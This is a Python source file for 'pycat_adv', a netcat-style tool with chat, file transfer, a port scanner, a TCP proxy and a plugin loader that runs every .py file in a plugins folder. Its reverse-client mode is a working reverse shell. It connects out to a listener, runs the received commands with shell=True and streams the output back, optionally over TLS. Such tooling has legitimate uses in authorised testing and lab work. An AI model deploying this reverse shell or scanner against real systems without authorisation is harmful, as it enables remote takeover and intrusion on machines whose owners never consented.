#!/usr/bin/env python3
import socket
import ssl
import threading
import argparse
import subprocess
import sys
import os
import time
import select
import importlib.util
import logging
import readline

# 1. PLUGIN SYSTEM
# We load all .py files in a "plugins" folder. Each plugin must define a
# "name" string and a "run(args: list[str]) -> str" function.
def load_plugins(path="plugins"):
    plugins = {}
    if not os.path.isdir(path):
        return plugins
    for fname in os.listdir(path):
        if not fname.endswith(".py"):
            continue
        full = os.path.join(path, fname)
        spec = importlib.util.spec_from_file_location(fname[:-3], full)
        mod = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(mod)
        if hasattr(mod, "name") and hasattr(mod, "run"):
            plugins[mod.name] = mod.run
    return plugins

PLUGINS = load_plugins()

# 2. LOGGING AND SESSION RECORDING
# Configure a logger that writes both to stdout and to a file if requested.
logger = logging.getLogger("pycat_adv")
logger.setLevel(logging.DEBUG)
fmt = logging.Formatter("%(asctime)s %(message)s", "%Y-%m-%d %H:%M:%S")
console_h = logging.StreamHandler(sys.stdout)
console_h.setFormatter(fmt)
logger.addHandler(console_h)

def add_file_logger(path):
    fh = logging.FileHandler(path)
    fh.setFormatter(fmt)
    logger.addHandler(fh)

# 3. SOCKET WRAPPER: TIMEOUT, RETRY, KEEPALIVE, TLS
def establish_connection(host, port, timeout, retries, keepalive, tls, cafile):
    # Attempt connection with timeout and retries
    attempt = 0
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            if keepalive:
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            sock.connect((host, port))
            if tls:
                ctx = ssl.create_default_context(ssl.Purpose.SERVER_AUTH, cafile=cafile)
                sock = ctx.wrap_socket(sock, server_hostname=host)
            return sock
        except Exception as e:
            attempt += 1
            if attempt > retries:
                logger.error(f"Connection failed after {retries} retries: {e}")
                sys.exit(1)
            logger.warning(f"Connect attempt {attempt}/{retries} failed, retrying...")
            time.sleep(1)

def wrap_server_socket(sock, tls, certfile, keyfile):
    if tls:
        ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        ctx.load_cert_chain(certfile=certfile, keyfile=keyfile)
        sock = ctx.wrap_socket(sock, server_side=True)
    return sock

# 4. BASIC SERVER & CLIENT FOR CHAT & INTERACTIVE SHELL
def server_mode(args):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((args.host, args.port))
    s.listen()
    s = wrap_server_socket(s, args.tls, args.tls_cert, args.tls_key)
    logger.info(f"Listening on {args.host}:{args.port}")
    while True:
        conn, addr = s.accept()
        logger.info(f"New connection from {addr}")
        if args.log:
            add_file_logger(args.log)
        threading.Thread(target=handle_chat, args=(conn, True, args)).start()

def client_mode(args):
    sock = establish_connection(
        args.host, args.port,
        timeout=args.timeout, retries=args.retries,
        keepalive=args.keepalive,
        tls=args.tls, cafile=args.tls_cafile
    )
    logger.info(f"Connected to {args.host}:{args.port}")
    if args.log:
        add_file_logger(args.log)
    handle_chat(sock, False, args)

def handle_chat(conn, is_server, args):
    """
    Simple two-way chat: one thread reads from network and prints;
    the other reads stdin and sends.
    Plugin commands start with "/plugin ".
    """
    def reader():
        while True:
            try:
                data = conn.recv(4096)
                if not data:
                    break
                text = data.decode(errors="ignore")
                logger.info(f"RECV: {text.rstrip()}")
                print(text, end="", flush=True)
            except:
                break

    threading.Thread(target=reader, daemon=True).start()
    # main loop: stdin -> network
    while True:
        try:
            line = input()
        except EOFError:
            break
        if line.startswith("/plugin "):
            # plugin invocation syntax: /plugin <name> arg1 arg2 ...
            parts = line.split()[1:]
            name, *pl_args = parts
            if name in PLUGINS:
                result = PLUGINS[name](pl_args)
                print(f"[PLUGIN {name}] {result}")
            else:
                print(f"[!] no such plugin '{name}'")
            continue
        conn.sendall(line.encode())
        logger.info(f"SENT: {line}")

# 5. REVERSE SHELL SUPPORT + COMMAND STREAMING + PLUGINS ON CLIENT
def reverse_server(args):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((args.host, args.port))
    s.listen()
    s = wrap_server_socket(s, args.tls, args.tls_cert, args.tls_key)
    logger.info(f"Reverse shell listening on {args.host}:{args.port}")
    conn, addr = s.accept()
    logger.info(f"Client shell connected: {addr}")
    if args.log:
        add_file_logger(args.log)
    # start thread to print client output
    threading.Thread(target=reader_shell, args=(conn,)).start()
    # send commands from server stdin
    while True:
        cmd = input("shell> ")
        if cmd.strip().lower() in ("exit", "quit"):
            break
        conn.sendall(cmd.encode() + b"\n")
    conn.close()

def reverse_client(args):
    sock = establish_connection(
        args.host, args.port,
        timeout=args.timeout, retries=args.retries,
        keepalive=args.keepalive,
        tls=args.tls, cafile=args.tls_cafile
    )
    logger.info("Connected back for reverse shell")
    # continuously receive commands
    while True:
        cmd = b""
        # receive until newline
        while not cmd.endswith(b"\n"):
            chunk = sock.recv(1024)
            if not chunk:
                sys.exit(0)
            cmd += chunk
        cmd_str = cmd.decode().strip()
        if cmd_str in ("exit", "quit"):
            break

        # check for plugin command
        if cmd_str.startswith("plugin "):
            _, name, *pl_args = cmd_str.split()
            if name in PLUGINS:
                out = PLUGINS[name](pl_args)
                sock.sendall(out.encode())
            else:
                sock.sendall(f"no plugin '{name}'".encode())
            continue

        # execute normal shell command with real-time streaming
        proc = subprocess.Popen(
            cmd_str, shell=True,
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT
        )
        # stream output as it appears
        for line in proc.stdout:
            sock.sendall(line)
        proc.wait()

def reader_shell(conn):
    """Print data coming from the reverse shell client."""
    while True:
        try:
            data = conn.recv(4096)
            if not data:
                break
            print(data.decode(), end="", flush=True)
        except:
            break

# 6. FILE TRANSFER (UPLOAD & DOWNLOAD)
def file_server(args):
    """
    In server mode with --upload:
      client will send file; we save to disk.
    In server mode with --download:
      client will request file; we read and send.
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((args.host, args.port))
    s.listen()
    logger.info(f"File server listening on {args.host}:{args.port}")
    conn, addr = s.accept()
    logger.info(f"Transfer connection from {addr}")
    if args.upload:
        # receiving a file from client
        filename = os.path.basename(args.upload)
        with open(filename, "wb") as f:
            while True:
                chunk = conn.recv(4096)
                if not chunk:
                    break
                f.write(chunk)
        logger.info(f"Saved upload to {filename}")
    elif args.download:
        # sending a file to client
        with open(args.download, "rb") as f:
            while chunk := f.read(4096):
                conn.sendall(chunk)
        logger.info(f"Sent file {args.download}")
    conn.close()

def file_client(args):
    sock = establish_connection(
        args.host, args.port,
        timeout=args.timeout, retries=args.retries,
        keepalive=args.keepalive,
        tls=args.tls, cafile=args.tls_cafile
    )
    if args.upload:
        # client sends local file to server
        with open(args.upload, "rb") as f:
            while chunk := f.read(4096):
                sock.sendall(chunk)
        logger.info(f"Uploaded {args.upload}")
    elif args.download:
        # client writes server file to local path
        outpath = os.path.basename(args.download)
        with open(outpath, "wb") as f:
            while chunk := sock.recv(4096):
                if not chunk:
                    break
                f.write(chunk)
        logger.info(f"Downloaded to {outpath}")
    sock.close()

# 7. PORT SCANNING UTILITY
def port_scan(args):
    """
    Scan a range of ports on target host using connect_ex.
    """
    open_ports = []
    for port in range(args.start, args.end + 1):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(args.timeout)
        res = s.connect_ex((args.host, port))
        s.close()
        if res == 0:
            open_ports.append(port)
    print(f"Open ports on {args.host}: {open_ports}")

# 8. SIMPLE TCP PROXY (PORT FORWARDING)
def proxy_mode(args):
    """
    Listen locally, forward all traffic bidirectionally
    to remote_host:remote_port.
    """
    def handle(client_sock):
        server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_sock.connect((args.remote_host, args.remote_port))
        # bidirectional copying
        sockets = [client_sock, server_sock]
        while True:
            r, _, _ = select.select(sockets, [], [])
            for s in r:
                data = s.recv(4096)
                if not data:
                    return
                # send to the other side
                dest = server_sock if s is client_sock else client_sock
                dest.sendall(data)

    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.bind((args.host, args.port))
    listener.listen()
    logger.info(f"Proxy listening on {args.host}:{args.port} -> {args.remote_host}:{args.remote_port}")
    while True:
        client, _ = listener.accept()
        threading.Thread(target=handle, args=(client,), daemon=True).start()

# 9. ARGPARSE & MAIN
def main():
    parser = argparse.ArgumentParser(description="pycat_adv: Python Netcat Alternative")
    sub = parser.add_subparsers(dest="mode", required=True)

    # chat server & client
    base = argparse.ArgumentParser(add_help=False)
    base.add_argument("host")
    base.add_argument("port", type=int)
    base.add_argument("--tls", action="store_true", help="Enable TLS")
    base.add_argument("--tls-cert")
    base.add_argument("--tls-key")
    base.add_argument("--tls-cafile", help="CA file for client")
    base.add_argument("--timeout", type=float, default=5.0)
    base.add_argument("--retries", type=int, default=3)
    base.add_argument("--keepalive", action="store_true")
    base.add_argument("--log", help="Log session to file")

    p_s = sub.add_parser("server", parents=[base], help="chat server")
    p_c = sub.add_parser("client", parents=[base], help="chat client")

    # reverse shell
    p_rs = sub.add_parser("reverse-server", parents=[base], help="reverse shell server")
    p_rc = sub.add_parser("reverse-client", parents=[base], help="reverse shell client")

    # file transfer
    p_fu = sub.add_parser("file-server", parents=[base], help="file transfer server")
    p_fu.add_argument("--upload", help="save incoming file as this name")
    p_fu.add_argument("--download", help="send this file to client")
    p_fc = sub.add_parser("file-client", parents=[base], help="file transfer client")
    p_fc.add_argument("--upload", help="send this local file")
    p_fc.add_argument("--download", help="save incoming file as this name")

    # port scan
    p_ps = sub.add_parser("scan", help="port scanner")
    p_ps.add_argument("host")
    p_ps.add_argument("--start", type=int, default=1)
    p_ps.add_argument("--end", type=int, default=1024)
    p_ps.add_argument("--timeout", type=float, default=0.5)

    # proxy
    p_px = sub.add_parser("proxy", parents=[base], help="TCP proxy/port forward")
    p_px.add_argument("remote_host")
    p_px.add_argument("remote_port", type=int)

    args = parser.parse_args()

    if args.mode == "server":
        server_mode(args)
    elif args.mode == "client":
        client_mode(args)
    elif args.mode == "reverse-server":
        reverse_server(args)
    elif args.mode == "reverse-client":
        reverse_client(args)
    elif args.mode == "file-server":
        file_server(args)
    elif args.mode == "file-client":
        file_client(args)
    elif args.mode == "scan":
        port_scan(args)
    elif args.mode == "proxy":
        proxy_mode(args)
    else:
        parser.print_help()

if __name__ == "__main__":
    main()
